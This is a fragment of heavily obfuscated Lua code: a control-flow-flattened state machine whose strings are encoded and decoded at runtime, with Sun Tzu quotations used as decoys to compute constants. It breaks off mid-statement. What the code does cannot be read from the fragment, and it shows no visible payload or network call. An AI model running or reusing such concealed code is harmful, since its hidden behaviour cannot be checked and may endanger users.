e[452]='LPOgWYwudb'c=163.37182271222034;b[D("\23\28\35\127\26\30\67\18\27\12\39")]=A("\5\15\36\9\2\48\63\1\3\6",C)e[169]='TyIEUKqOCp'a=172;e[441]=false;d=207.9139294203061 end;if((c==614.8432922323952)and(d==122.77217558653473)and(e[441]==false)and(e[169]=='KyCIhVm7Cv')and(e[452]=='MOmXSg2AUc'))and(a==532)then d=508.4125337370034;b[D("\23\25\33\54\16\1\65")]=A("\112\46\91\3\56\57\39\51\2\11",C)c=912.805725148168;e[169]='iyZ9Md7Rdh'e[441]=false;e[452]='fdRz9JDonv'a=917 end;while((c==13.56693935735988)and(d==135.31568264065032)and(e[441]==false)and(e[169]=='eDIYVvwiFn')and(e[452]=='4Tc5KD4tSR'))and(a==114)do a=241;e[169]='RBF6b5pBKQ'b[D("\23\15\41\31\76\7\33\16\47\49")]=A("\30\6\9\46\62\56\36\85\6\42",C)c=172.26797397552627;e[441]=false;e[452]='aNpUDcygZ7'd=274.3114844210588;break end;while((c==70.1119362049946)and(d==689.518571838518)and(e[441]==false)and(e[169]=='1j5RW07z2J')and(e[452]=='wivTgs186u'))and(a==338)do d=740.4026258981861;c=190.67223419539698;a=750;e[169]='bDwXYv8Jee'e[452]='BOHB9cEMop'b[D("\23\0\43\14\62\57\17")]=A("\47\36\45\29\22\4\5\87\37\7",C)e[441]=false;break end;while(a==124)and((c==191.46684279832309)and(d==79.84758061808364)and(e[441]==false)and(e[169]=='KRy1j1LjsP')and(e[452]=='Bkwl26tUeW'))do e[169]='KyCIhVm7Cv'e[441]=false;c=614.8432922323952;a=532;d=122.77217558653473;e[452]='MOmXSg2AUc'b[D("\23\38\92\5\35\95\69\16")]=A("\9\38\29\34\21\13\15\71\2\15\8\104\98\93\110\85",C)break end;if((c==16.32495026738507)and(d==106.17256948328247)and(e[441]==false)and(e[169]=='nvhG1RQPYo')and(e[452]=='5og3HjpHI3'))and(a==122)then a=338;d=689.518571838518;c=70.1119362049946;e[441]=false;e[169]='1j5RW07z2J'e[452]='wivTgs186u'b[D("\23\57\48\20\56\16\78\16\1")]=A("\52\4\32\19\8",C)end;while((c==35.8156046961284)and(d==427.79796975946806)and(e[441]==false)and(e[169]=='HaqrTdaUs2')and(e[452]=='8vhiaj96Qn'))and(a==776)do e[441]=false;c=90.56758361833431;b[D("\23\56\62\47\18\45\70\45\0\41\21\11\47\90\112\57")]=A("\43\37\1\0\0\11\15\87\34\15",C)a=584;e[169]='iqF6ZBLwIY'e[452]='jSLCV35DLM'd=360.9239072875101;break end;while((c==276.0657674957972)and(d==488.5771142291042)and(e[441]==false)and(e[169]=='oaPSVYYRsh')and(e[452]=='t6RYC8HHtS'))and(a==650)do e[169]='3L4LEy8vzS'e[452]='GrzCh1zeOL'c=6.991731555599922;b[D("\23\35\48\14\54\3\34\95\69\35\28\36\127\93")]=A("\59\29\86\17\17\3\62\21",C)d=19.563650927795628;a=932;e[441]=false;break end;if(a==634)and((c==667.0707339051074)and(d==143.44971501751866)and(e[441]==false)and(e[169]=='Zvkp03EVFA')and(e[452]=='LWzbrctmmd'))then d=290.9165718976278;e[441]=false;e[452]='h3nCFYFRTW'c=265.11266532644055;a=548;e[169]='k1qOPFn9Q6'b[D("\23\125\44\35\19\57\53\81\6\22")]=A("\101",C)end;if((c==81.21326622206469)and(d==25.783919362369858)and(e[441]==false)and(e[169]=='7ARARiR9pr')and(e[452]=='kZbzckI05Q'))and(a==516)then c=170.46812660948726;e[441]=false;d=313.01241369880046;e[169]='qT0QkBgLP6'b[D("\23\7\5\23\2\34\3\87\51\54\52\48\114\53\118")]=A("\120\100\91\115\67\94\66\85\66\91\83\125\121\89\118\68\88\70\84",C)a=181;e[452]='p4HCB36cOT'end;if(a==200)and((c==378.1057334587622)and(d==61.6138108977456)and(e[441]==false)and(e[169]=='5uUGi5ijgW')and(e[452]=='D2hxcV0eQO'))then a=592;c=15.455560486829276;e[441]=false;b[D("\23\60\8\114\34\16\36\12")]=A("\29\5\5\45\19\1\64\81\39\29",C)e[452]='OmBofU2Rpo'd=182.2592978030402;e[169]='jUuTYW2nQE'end;if((c==302.86907818706555)and(d==144.6568118224165)and(e[441]==false)and(e[169]=='IldmjIFa4Q')and(e[452]=='eEfVf821tf'))and(a==587)then d=31.302340756608213;e[452]='cr5mhmxBJG'c=496.0662179927654;b[D("\23\18\92\46\53\10\31\14\27\25\94\30\123\2")]=A("\4\26\55\18\28\49\56\29\49\93",C)e[169]='Gu5rqjd86E'a=432;e[441]=false end;if((c==251.19825534282867)and(d==238.1556725151479)and(e[441]==false)and(e[169]=='G9HHLPy36Q')and(e[452]=='v7j202IPie'))and(a==380)then b[D("\23\8\14\15\28\5\0\31\68\25\36")]=A("\52\31\33\10\8",C)c=276.0657674957972;e[452]='t6RYC8HHtS'e[169]='oaPSVYYRsh'd=488.5771142291042;e[441]=false;a=650 end;while((c==99.76762841721009)and(d==293.58040718622567)and(e[441]==false)and(e[169]=='4XD6uAlSze')and(e[452]=='NXZnopQVv6'))and(a==159)do a=863;d=795.9896890136158;e[441]=false;c=482.3570252784566;b[D("\23\12\31\62\2\25")]=A("\60\43\13\43\17",C)e[169]='5g5hVgeJSQ'e[452]='9FEpnHmrxZ'break end;while((c==111.17664892751841)and(d==12.99075523033159)and(e[441]==false)and(e[169]=='fEVeng3I9V')and(e[452]=='gGZaq6k3X0'))and(a==34)do b[D("\23\48\61\115\2\89")]=A("\37\26\55\31\36\32\19\49\21\35",C)c=168.70691956429778;e[452]='n9VhkhtxrR'a=476;e[169]='dA7VzF3Mtl'd=572.3879451800492;e[441]=false;break end;if(a==379)and((c==35.54978769125634)and(d==317.21301059750976)and(e[441]==false)and(e[169]=='bQiz8wPrXV')and(e[452]=='D08pv9f1RC'))then e[441]=false;b[D("\23\37\6\118\76\35\17")]=A("\48\37\89\30\59\16\78\84\64\23",C)e[452]='7fOMqgeJoz'd=131.70445003906815;e[169]='hNoXgTOt7c'c=305.8597125825395;a=768 end;while((c==455.58686379890275)and(d==230.80649802080703)and(e[441]==false)and(e[169]=='0zn9nablX0')and(e[452]=='ewQSZyvM0t'))and(a==684)do e[441]=false;d=9.207286427522735;e[452]='vvggCjaWrl'c=151.28781413991874;b[D("\23\34\32\115\0\62\30\47\30\32\32")]=A("\52\9\32\9\55\40\34\51\49\44\42\13\54",C)e[169]='jiuxaigWrv'a=566;break end;if((c==265.11266532644055)and(d==290.9165718976278)and(e[441]==false)and(e[169]=='k1qOPFn9Q6')and(e[452]=='h3nCFYFRTW'))and(a==548)then a=784;d=559.4110026841272;e[441]=false;e[452]='QkDBjbJNYt'c=210.0896066235834;b[D("\23\46\56\117\61\58\14\36")]=A("\48\51\95\118\24\81\58\29\69\33",C)e[169]='e1eCoAO2nu'end;while((c==236.67020902004379)and(d==79.22223938600442)and(e[441]==false)and(e[169]=='ZNSL2j1URC')and(e[452]=='ATRfnlcAIo'))and(a==157)do e[169]='YbrrLEkS8n'b[D("\23\31\86\61\46\2\79\36\63\13\2\45\56\46\2\4")]=A("\48\18\0\117\29\90\46\56\10\34",C)c=391.4999555694689;e[452]='DRaGSER9ky'e[441]=false;a=492;d=152.33356513523597;break end;while((c==108.89700282466099)and(d==12.649863544157414)and(e[441]==false)and(e[169]=='YdNF4nLEh6')and(e[452]=='DWBac78jJp'))and(a==746)do e[169]='JDiZT4z5Yk'e[441]=false;a=670;d=581.1226706195524;c=102.76655697052807;e[452]='HnwTR4eizV'b[D("\23\43\36\63\4\80\66\46")]=A("\48\51\6\126\13\48\31\61\64\22",C)break end;while((c==151.28781413991874)and(d==9.207286427522735)and(e[441]==false)and(e[169]=='jiuxaigWrv')and(e[452]=='vvggCjaWrl'))and(a==566)do a=988;e[452]='kc4dCKfrhu'e[441]=false;e[169]='6s6vBMwV1n'd=33.81762164963651;b[D("\23\57\9\63\45\81\7\86\64")]=A("\3\6",C)c=226.6161631052762;break end;if(a==359)and((c==418.3011600992784)and(d==16.99664518004102)and(e[441]==false)and(e[169]=='RutGYaYTDl')and(e[452]=='Ac7RqQQjbc'))then d=192.09276054605238;e[452]='BT2BRUDBDd'c=68.55821912089581;e[441]=false;a=699;e[169]='bacnNzPWvb'b[D("\23\56\36\61\62\58\70\1\24\3\2\27\63\58\5\59")]=A("\52\6\59\59",C)end;if((c==186.3746156136341)and(d==408.3512722931094)and(e[441]==false)and(e[169]=='4srGLmh5J2')and(e[452]=='17mvewCU8h'))and(a==264)then c=184.81766809387705;e[169]='yv0jiL7tOA'e[441]=false;e[452]='iOtrKpEvt9'b[D("\23\30\1\114\65\89\51\9\42\15\17\45\39\91\10")]=A("\42\9\5\113\46\34\17\62\34\58",C)d=200.8742803782636;a=319 end;if((c==183.42976578508765)and(d==111.06027903808112)and(e[441]==false)and(e[169]=='nnWf8Qeiib')and(e[452]=='LFOPFODy0Y'))and(a==795)then b[D("\23\43\3\112\17\44\63\52\65\13\19\43\4\27\8")]=A("\52\25\27\53\29\7\17\5\9\26\3\52",C)d=98.6713767971154;e[169]='mOpTtY6BcY'a=260;c=65.55353081554861;e[441]=false;e[452]='nJesckxsuE'end;while((c==436.1908012406559)and(d==804.0663496711318)and(e[441]==false)and(e[169]=='OQBsQ01GOa')and(e[452]=='zoOvkcUJdW'))and(a==269)do b[D("\23\37\13\116\3\14\78")]=A("\28\15\4\45\57\13\69\18",C)e[452]='njKycSaSBW'e[169]='rBRVO6aKjz'a=150;d=463.8782903294591;c=65.99439114899135;e[441]=false;break end;while(a==267)and((c==68.69539674236098)and(d==164.1783364849045)and(e[441]==false)and(e[169]=='5PwhblO61H')and(e[452]=='Ijljwdtrli'))do b[D("\23\114\11\1\44\19\15\94")]=A("\33\29\32\29\51\37\61\14\23\11",C)a=124;e[452]='Bkwl26tUeW'c=191.46684279832309;e[169]='KRy1j1LjsP'd=79.84758061808364;e[441]=false;break end;while((c==292.4480169183831)and(d==103.47576542322999)and(e[441]==false)and(e[169]=='YfApft4z6M')and(e[452]=='wFlvLvWH8s'))and(a==33)do a=872;e[452]='aRgM8tKBfs'c=814.9275166789259;e[441]=false;d=155.0737531105083;e[169]='r7NasQLxX5'b[D("\23\24\57\38\55\16\60\19\55\20\33\0\0\58\6\2")]=A("\1\1\5\52\63\91\33\22\73\24",C)break end;if(a==319)and((c==184.81766809387705)and(d==200.8742803782636)and(e[441]==false)and(e[169]=='yv0jiL7tOA')and(e[452]=='iOtrKpEvt9'))then d=81.65656023810516;a=504;e[452]='sntLJLPYr1'c=150.7180234176826;e[441]=false;b[D("\23\24\63\47\23\39")]=A("\121\35\53\47\71\89\25\52\38\15",C)e[169]='3gEZzdRPtZ'end;if(a==677)and((c==35.572577503678)and(d==602.6044499136273)and(e[441]==false)and(e[169]=='l2mX3nDp6b')and(e[452]=='RJ4v2RMwJO'))then e[169]='h0coMm7oil'b[D("\23\59\55\117\18")]=A("\58\38\93\47\22\95\49\18\59\42",C)c=88.64362956483592;d=487.4243891781486;e[441]=false;a=194;e[452]='ynFdFMgkbg'end;if(a==260)and((c==65.55353081554861)and(d==98.6713767971154)and(e[441]==false)and(e[169]=='mOpTtY6BcY')and(e[452]=='nJesckxsuE'))then e[169]='CTkn4TKawv'c=23.17363707357344;d=328.1516977056299;b[D("\23\43\0\45\28\14\56\52\65\9\1")]=A("\17\9\41\52\34\0\25\87\36\41",C)e[441]=false;e[452]='Mff7ULNfi4'a=22 end;if(a==768)and((c==305.8597125825395)and(d==131.70445003906815)and(e[441]==false)and(e[169]=='hNoXgTOt7c')and(e[452]=='7fOMqgeJoz'))then a=791;e[441]=false;e[169]='bcGzYuFSoD'e[452]='FZ926yzavA'b[D("\23\45\34\119\35\94\58\2")]=A("\60\25\28\22\51\80\55\16\63\94",C)c=41.57103066479699;d=208.33672250580045 end;if((c==110.7581452440547)and(d==75.64467542979713)and(e[441]==false)and(e[169]=='3anJ5pQ80c')and(e[452]=='SWo0n9Aisn'))and(a==442)then d=69.73964132638964;e[452]='8LnqZVSY80'b[D("\23\51\86\34\58\49\28\9\10\3\86\47\5\87")]=A("\0\47\29\53\0\29\86\40\18\8\19\59\41\14\51\27\27",C)e[169]='kjL3dsMqnz'a=453;e[441]=false;c=66.22397178776556 end;if((c==251.81258929925738)and(d==160.6221626582243)and(e[441]==false)and(e[169]=='YQKyUJ0SZI')and(e[452]=='3nX0f9CLet'))and(a==170)then e[452]='h1YXJ8Z7dC'a=125;c=132.98117198303382;b[D("\23\13\60\45\70\92\68\16\39\59")]=A("\3\33\13\52\0\56\31\2\10\28",C)d=61.39795387882763;e[441]=false;e[169]='T4zSyfrEJP'end;while((c==404.45976086436787)and(d==551.1984852766207)and(e[441]==false)and(e[169]=='Euby28a6nY')and(e[452]=='h9PQYAyZHt'))and(a==326)do b[D("\23\43\2\0\48\93\60\49\9\30")]=A("",C)e[441]=false;a=269;c=436.1908012406559;e[452]='zoOvkcUJdW'e[169]='OQBsQ01GOa'd=804.0663496711318;break end;while(a==181)and((c==170.46812660948726)and(d==313.01241369880046)and(e[441]==false)and(e[169]=='qT0QkBgLP6')and(e[452]=='p4HCB36cOT'))do e[452]='LxjkHu3oNq'e[441]=false;d=69.16429584785358;c=213.87437056099947;e[169]='XpnYWHcIY4'b[D("\23\2\13\14\6\7\14\95\42")]=A("\109\57\74\52",C)a=702;break end;if((c==445.22391871320133)and(d==359.8013495997068)and(e[441]==false)and(e[169]=='X05UohB8G7')and(e[452]=='9BhBfqgfnR'))and(a==668)then a=634;b[D("\23\46\61\61\51\13\1\94\49\95\52")]=A("\35\27\53\38\26\94\71\37\17\92",C)c=667.0707339051074;d=143.44971501751866;e[441]=false;e[169]='Zvkp03EVFA'e[452]='LWzbrctmmd'end;if((c==292.4328964777783)and(d==173.81999294834682)and(e[441]==false)and(e[169]=='bKg2xZ5roc')and(e[452]=='ItLpL4nEkq'))and(a==671)then e[452]='Ac7RqQQjbc'c=418.3011600992784;e[441]=false;b[D("\23\36\87\127\62\7\58\29\27\33\41\127\114\92\49")]=A("\45\3\93\3\66\49\63\2\36\42",C)e[169]='RutGYaYTDl'd=16.99664518004102;a=359 end;while((c==67.51880924935898)and(d==99.76410311271961)and(e[441]==false)and(e[169]=='87NwztBuDB')and(e[452]=='vRFChhTYCA'))and(a==959)do e[169]='hwivdh9MEp'e[452]='I2Q3ucFQv4'e[441]=false;b[D("\23\19\24\127\51\29\32\4\56\33\1\61\40\7")]=A("\44\39\79\51\28\0\5\71\4\1\70\0\47\29\53\0\29\86\8\2\78\43\45\38\14\41\23\1\25\11\9",C)a=2;c=3.9937771762675087;d=115.37697238735377;break end;if((c==5.318995313896302)and(d==4.92404801216662)and(e[441]==false)and(e[169]=='dmlbd0sFlq')and(e[452]=='TLWdocDpl6'))and(a==25)then e[452]='mmXNlwxpr1'a=962;b[D("\23\60\13\13\54\16")]=A("\52\7\58\11\8",C)d=203.0777517741271;e[441]=false;e[169]='ozbI5zFfVW'c=3.0489526536600247 end;if(a==554)and((c==175.4771316917748)and(d==28.862909195005788)and(e[441]==false)and(e[169]=='CN2yQhQIea')and(e[452]=='s7HIuvXf2u'))then a=380;e[169]='G9HHLPy36Q'd=238.1556725151479;e[441]=false;b[D("\23\61\23\62\70\36\2\85\7\26\35\14\8\36\22\68")]=A("\52\15\62\59",C)c=251.19825534282867;e[452]='v7j202IPie'end;while((c==394.38674896614646)and(d==778.3969671299377)and(e[441]==false)and(e[169]=='3Jc7qpY7H9')and(e[452]=='QVySJF4Nmu'))and(a==53)do e[452]='owh2DSGt9W'd=482.66085158508463;a=340;e[169]='5gxriOHDRy'c=236.222072674609;b[D("\23\32\24\10\68\16\5\6\28\91")]=A("\123\24\86\48\69\58\18\11\39\91",C)e[441]=false;break end;while(a==271)and((c==79.45849392319629)and(d==0.04421061783725655)and(e[441]==false)and(e[169]=='IqIj8r4kPL')and(e[452]=='1GEdUf5tQa'))do e[452]='SFs47ymghW'a=934;c=248.05156007256232;b[D("\23\9\32\51\22\46\27\61\20\49\86\2\12")]=A("\63\43\14",C)e[169]='FPm2wEMNC0'e[441]=false;d=122.08395900483097;break end;while((c==481.7252505620371)and(d==732.3637925318143)and(e[441]==false)and(e[169]=='EOsHv2jlLD')and(e[452]=='4PZjEHpYTB'))and(a==546)do c=68.69539674236098;d=164.1783364849045;e[452]='Ijljwdtrli'e[441]=false;a=267;e[169]='5PwhblO61H'b[D("\23\5\36\15\32\25\67\23\2\55")]=A("\42",C)break end;while(a==791)and((c==41.57103066479699)and(d==208.33672250580045)and(e[441]==false)and(e[169]=='bcGzYuFSoD')and(e[452]=='FZ926yzavA'))do e[441]=false;d=9.405782995567524;e[169]='Qa4j74aiGw'b[D("\23\21\2\51\70\33\1\47\73\47\39")]=A("\59\62\29\46\26\14",C)a=74;e[452]='7XFbCqTIKf'c=176.89594285992086;break end;if((c==15.81505442086331)and(d==681.4192690444966)and(e[441]==false)and(e[169]=='qYhFfGfGNS')and(e[452]=='eaQ6kOs3YL'))and(a==676)then e[452]='kZbzckI05Q'e[441]=false;a=516;c=81.21326622206469;b[D("\23\6\31\62\57\0\70\41\5\24\3\37\58\25")]=A("\39\43\58\38\65\10\15\54\1\38",C)e[169]='7ARARiR9pr'd=25.783919362369858 end;if((c==72.90715326527312)and(d==819.0132190317297)and(e[441]==false)and(e[169]=='38RiivWm7C')and(e[452]=='0b1BQjuaCF'))and(a==296)then c=300.9354820443647;e[452]='TkmQY7a7xq'd=1.7065356415582398;b[D("\23\6\0\10\51\3\52\19\5\6\43\37\40")]=A("\34\12\62\22\44\94\67\46\72\93",C)e[441]=false;a=390;e[169]='rzTR5YOgnJ'end;if((c==1.7473757435744102)and(d==65.93474407996553)and(e[441]==false)and(e[169]=='Y014ieY5ys')and(e[452]=='NyGfVbsmKJ'))and(a==631)then e[169]='nBEOIVn7eu'a=884;e[441]=false;d=178.6151744525185;b[D("\23\59\55\21\36\26\57\37\19\43\4\36\36\40")]=A("\52\6\42\59",C)e[452]='qBeVx1fCeE'c=267.01185019512525 end;while((c==213.87437056099947)and(d==69.16429584785358)and(e[441]==false)and(e[169]=='XpnYWHcIY4')and(e[452]=='LxjkHu3oNq'))and(a==702)do c=79.45849392319629;d=0.04421061783725655;e[452]='1GEdUf5tQa'e[169]='IqIj8r4kPL'a=271;e[441]=false;b[D("\23\25\43\117\27\34\20\3")]=A("\28\43\22\17\0\14\78\18\2\9",C)break end;if(a==872)and((c==814.9275166789259)and(d==155.0737531105083)and(e[441]==false)and(e[169]=='r7NasQLxX5')and(e[452]=='aRgM8tKBfs'))then c=242.21950756719244;e[169]='qkOZYG1NYO'b[D("\23\122\39\19\45\17\27\40\26\58\41\31\63\53")]=A("\48\5\88\16\38\5\44\19\28\58",C)a=488;e[441]=false;e[452]='xWA5nM4gdO'd=150.03628981593252 end;if(a==23)and((c==187.81754857272705)and(d==1.5191303345499618)and(e[441]==false)and(e[169]=='5g36L2ZsqZ')and(e[452]=='nYPzNQ6qGr'))then a=266;b[D("\23\43\48\22\17\32\52\36")]=A("\11\51\60\63\5\13\28\80\69\55",C)e[452]='24rxcR8ksu'c=326.41869424256606;e[169]='GzCbgGgubh'e[441]=false;d=164.489646792587 end;if(a==618)and((c==112.68248171310796)and(d==410.41005165620913)and(e[441]==false)and(e[169]=='PsEq7nUIG1')and(e[452]=='yYexi95IAo'))then d=175.30286578682558;e[441]=false;e[452]='uAI4tjwaes'a=4;c=582.1274663771266;e[169]='DluTGfkJQN'b[D("\23\40\32\19\0\59\63\19\72\32\17")]=A("\27\31\63\2\38\54\57\55",C)end;if((c==496.0662179927654)and(d==31.302340756608213)and(e[441]==false)and(e[169]=='Gu5rqjd86E')and(e[452]=='cr5mhmxBJG'))and(a==432)then e[169]='nvhG1RQPYo'b[D("\23\7\3\34\31\57\65")]=A("\48\18\48\31\46\89\31\83\31\23",C)e[452]='5og3HjpHI3'd=106.17256948328247;c=16.32495026738507;e[441]=false;a=122 end;while((c==21.42778023850896)and(d==160.7027522423931)and(e[441]==false)and(e[169]=='diYAoG7rds')and(e[452]=='4RLwqH9Mfx'))and(a==572)do b[D("\23\127\43\0\76\12\27\32")]=A("\45\56\39\19\50\26\30\30\65\52",C)e[452]='4Tc5KD4tSR'a=114;e[169]='eDIYVvwiFn'e[441]=false;d=135.31568264065032;c=13.56693935735988;break end;if(a==172)and((c==163.37182271222034)and(d==207.9139294203061)and(e[441]==false)and(e[169]=='TyIEUKqOCp')and(e[452]=='LPOgWYwudb'))then d=88.71654134470553;b[D("\23\57\55\55\63\58\14\5\27\55\4\17\58\4\118\5")]=A("\122\127\88",C)a=(#('"He will win who knows when to fight and when not to fight." - Sun Tzu') - 59)e[169]='zLpfNCfnP2'e[452]='LatcEyJpwO'e[441]=false;c=20.614518668584257 end;if((c==190.67223419539698)and(d==740.4026258981861)and(e[441]==false)and(e[169]=='bDwXYv8Jee')and(e[452]=='BOHB9cEMop'))and(a==750)then d=793.1292951012157;e[169]='9T8GtG9Sf9'c=168.56140243157995;e[441]=false;a=828;e[452]='wapSBQzupf'b[D("\23\62\10\0\34\7\32\31\53\49\4\5\35\22\33\60")]=A("\58\60\56\32\53",C)end;while(a==488)and((c==242.21950756719244)and(d==150.03628981593252)and(e[441]==false)and(e[169]=='qkOZYG1NYO')and(e[452]=='xWA5nM4gdO'))do c=393.8049948204668;e[169]='tMHa9faf9g'b[D("\23\39\95\126\60\88\79\48\41\93\42\46\122")]=A("\17\126\21\51\50\35\63\33\41\15",C)d=129.76262370480993;e[441]=false;a=877;e[452]='U2URtd8hsl'break end;while((c==68.55821912089581)and(d==192.09276054605238)and(e[441]==false)and(e[169]=='bacnNzPWvb')and(e[452]=='BT2BRUDBDd'))and(a==699)do b[D("\23\9\94\126\36\30\7\4\50\4\11\41\45")]=A("\48\37\89\30\59\16\78\84\64\23",C)c=213.853895182474;e[452]='rZV4ehdXif'e[169]='FP1SPB2ahM'd=138.20233894942152;a=175;e[441]=false;break end;while((c==912.211156570489)and(d==279.9146523035364)and(e[441]==false)and(e[169]=='z4B8Sxi5oC')and(e[452]=='bJTZ4uUxAp'))and(a==396)do e[169]='PGE087CpNm'a=875;b[D("\23\8\53\24\4\90\20\53\7\4\3\43\56")]=A("\47\33\44\54\22\91\57\87\73\8",C)e[441]=false;e[452]='Fk2gDfRBiA'd=141.9132616849504;c=225.002004411251;break end;if((c==213.853895182474)and(d==138.20233894942152)and(e[441]==false)and(e[169]=='FP1SPB2ahM')and(e[452]=='rZV4ehdXif'))and(a==175)then c=168.44002670978787;e[452]='rpCorJEScK'e[441]=false;b[D("\23\63\44\61\71\48\63\95")]=A("\60\43\13\43\17",C)d=125.24024709655275;a=672;e[169]='MBqijrXIvf'end;while((c==20.614518668584257)and(d==88.71654134470553)and(e[441]==false)and(e[169]=='zLpfNCfnP2')and(e[452]=='LatcEyJpwO'))and(a==11)do c=21.42778023850896;e[441]=false;e[169]='diYAoG7rds'e[452]='4RLwqH9Mfx'b[D("\23\39\86\40\67\40\31\86")]=A("\24\126\55\35\70\63\23\61\30\24",C)a=572;d=160.7027522423931;break end;while(a==811)and((c==209.15521085304866)and(d==364.17483772183436)and(e[441]==false)and(e[169]=='5Wz5EpnKxu')and(e[452]=='lJ1kaE6LS5'))do a=671;e[169]='bKg2xZ5roc'e[441]=false;e[452]='ItLpL4nEkq'd=173.81999294834682;c=292.4328964777783;b[D("\23\14\57\3\7\62\47\37\51\88\13\36\33\39\43\56")]=A("\43\31\91\4\35\29\0",C)break end;while((c==263.74563677351347)and(d==649.5104814266402)and(e[441]==false)and(e[169]=='29by3NxYLO')and(e[452]=='xrZvF7NG0Q'))and(a==783)do e[169]='YdNF4nLEh6'e[441]=false;a=746;b[D("\23\4\14\126\35\28\69")]=A("\41",C)d=12.649863544157414;c=108.89700282466099;e[452]='DWBac78jJp'break end;while(a==365)and((c==501.88858621984065)and(d==498.5985271117964)and(e[441]==false)and(e[169]=='k3NFRM373l')and(e[452]=='EYCX8sytpw'))do e[169]='QrokTurOBE'e[452]='4015vs6ze3'b[D("\23\15\61\8\48\27\15\17\17\15\1")]=A("\113\34\44\33\24\14\36\49\73\33",C)d=168.30864678559016;a=355;c=70.29971112252217;e[441]=false;break end;while((c==272.05492265490017)and(d==29.606991899071794)and(e[441]==false)and(e[169]=='OvM3JPicUW')and(e[452]=='iQ49t6yjOh'))and(a==381)do a=501;e[441]=false;e[169]='Wzu8XSQdqS'b[D("\23\31\1\50\60\27\24\10\31\3\41")]=A("\48\18\0\117\29\90\46\56\10\34",C)d=239.16700112510514;e[452]='QsGi7NUGHn'c=415.533199589295;break end;if(a==770)and((c==397.7858327468677)and(d==645.3338854743135)and(e[441]==false)and(e[169]=='Rid8EdX5r1')and(e[452]=='8RgOfSKQ5P'))then break end;if((c==393.8049948204668)and(d==129.76262370480993)and(e[441]==false)and(e[169]=='tMHa9faf9g')and(e[452]=='U2URtd8hsl'))and(a==877)then a=456;b[D("\23\37\14\4\64\54\47\94\19")]=A("\11\2\62\41\69\25\15\40\42\43",C)e[169]='fMdP4XuxEt'e[452]='ju9D8pgppW'd=527.7302053697167;c=3.977879268081319;e[441]=false end;if(a==802)and((c==586.2193206433845)and(d==336.22857185436743)and(e[441]==false)and(e[169]=='ETnKAbZNq0')and(e[452]=='IvreJ5RcsH'))then e[169]='xC5atDmWWn'e[441]=false;d=325.3696759256747;c=597.6090592480714;b[D("\23\35\7\61\22\45")]=A("\114\98\74\35\94\64\76",C)a=349;e[452]='juqIJLY2l0'end;while(a==616)and((c==82.04088425117942)and(d==48.69962943948238)and(e[441]==false)and(e[169]=='RIALAFrvv4')and(e[452]=='5ZsgoUckFu'))do b[D("\23\14\89\42\70\49")]=A("\36\62\12\61\28\62\79\85\72\13",C)a=189;e[452]='SXbntwgw1j'd=50.0156316369797;e[169]='7HEXQ04Xm5'c=60.38122218582124;e[441]=false;break end;while(a==349)and((c==597.6090592480714)and(d==325.3696759256747)and(e[441]==false)and(e[169]=='xC5atDmWWn')and(e[452]=='juqIJLY2l0'))do c=11.940539496046698;e[441]=false;b[D("\23\39\25\2\46\36\57\29\6\15\45\29\45\14\2\51")]=A("\28\28\1\119\16\10\32\40\70\62",C)a=814;e[452]='V0q2apK1dn'e[169]='CaSPWNGObk'd=690.3419385502464;break end;while((c==241.09470132733043)and(d==121.17618916327532)and(e[441]==false)and(e[169]=='LMeo76PtQe')and(e[452]=='s4QPXVT1SZ'))and(a==273)do e[452]='Ih7eQ5gpKV'a=625;e[441]=false;e[169]='CFRuJJCGPT'd=46.77190947898791;c=263.7038154403076;b[D("\23\36\58\126\14\92\39\53\71\44\7\11\47")]=A("\48\48\94\62\70\38\14\81\73\94",C)break end;while((c==417.0950443886884)and(d==702.5206244050557)and(e[441]==false)and(e[169]=='l4Ere3QEya')and(e[452]=='A3Geiv7xYz'))and(a==101)do e[452]='EYCX8sytpw'a=365;b[D("\23\40\8\112\24\32")]=A("\113\115\39\54\16\48\12\94\31\59",C)c=501.88858621984065;e[441]=false;e[169]='k3NFRM373l'd=498.5985271117964;break end;if((c==48.96270601440641)and(d==113.82826969321907)and(e[441]==false)and(e[169]=='LKZujkew83')and(e[452]=='WHdX8j1Nmp'))and(a==324)then c=150.74742244624707;e[441]=false;e[452]='92VFVeVxIW'a=99;b[D("\23\31\27\32\34\3\2\22\33\42\49\15\1\33")]=A("\25\44\29\12\63\89\30\87\2\10",C)d=316.9499802026752;e[169]='ayg1wqRfbg'end;while((c==150.7180234176826)and(d==81.65656023810516)and(e[441]==false)and(e[169]=='3gEZzdRPtZ')and(e[452]=='sntLJLPYr1'))and(a==504)do a=843;e[169]='GWcT0xKg0N'e[452]='C6DQa98JzI'c=224.81924114241053;e[441]=false;d=449.1732209339906;b[D("\23\25\10\19\68\45\17\44\70\27\1\5")]=A("\52\14\38\17\8",C)break end;if(a==(#('"It is easy to love your friend, but sometimes the hardest lesson to learn is to love your enemy." - Sun Tzu') - 106))and((c==3.9937771762675087)and(d==115.37697238735377)and(e[441]==false)and(e[169]=='hwivdh9MEp')and(e[452]=='I2Q3ucFQv4'))then a=947;d=467.4008059189521;e[452]='vnepdaEdTH'e[169]='bVoJu5nb2N'e[441]=false;b[D("\23\44\93\42\68\34\27")]=A("\48\18\38\116\45\37\71\46\68\86",C)c=212.88771405844017 end;if(a==197)and((c==189.8063627152486)and(d==82.36235859652813)and(e[441]==false)and(e[169]=='uxeczImUn4')and(e[452]=='cukeInlNOH'))then a=264;e[169]='4srGLmh5J2'd=408.3512722931094;e[441]=false;b[D("\23\62\94\4\34\39\55\2\71")]=A("\0\5\10\16\6\80\17\48\64\25",C)c=186.3746156136341;e[452]='17mvewCU8h'end;if(a==752)and((c==556.6719862750879)and(d==130.30745228111493)and(e[441]==false)and(e[169]=='FgIVHUjxul')and(e[452]=='GSFXjOHalh'))then d=1.5191303345499618;e[452]='nYPzNQ6qGr'c=187.81754857272705;e[441]=false;e[169]='5g36L2ZsqZ'a=((function(A) return (#A - 186) end)('Anger may in time change to gladness; vexation may be succeeded by content. But a kingdom that has once been destroyed can never come again into being; nor can the dead ever be brought back to life." - Sun Tzu'))b[D("\23\57\7\115\36\45\16\29\62\5")]=A("\30\43\7\20\50\42\36\36\68\88",C)end;if((c==102.76655697052807)and(d==581.1226706195524)and(e[441]==false)and(e[169]=='JDiZT4z5Yk')and(e[452]=='HnwTR4eizV'))and(a==670)then e[441]=false;d=82.69617182367604;e[452]='5xb5pHufr7'c=127.25126900798116;e[169]='hNm4uP9aOa'b[D("\23\62\36\36\36\49\61\63\38\58\14\62\3\32")]=A("\52\25\58\5\8",C)a=813 end;if(a==20)and((c==56.1702834279291)and(d==52.57754738590913)and(e[441]==false)and(e[169]=='SKdXLzQmpK')and(e[452]=='1CLnHkxaaq'))then 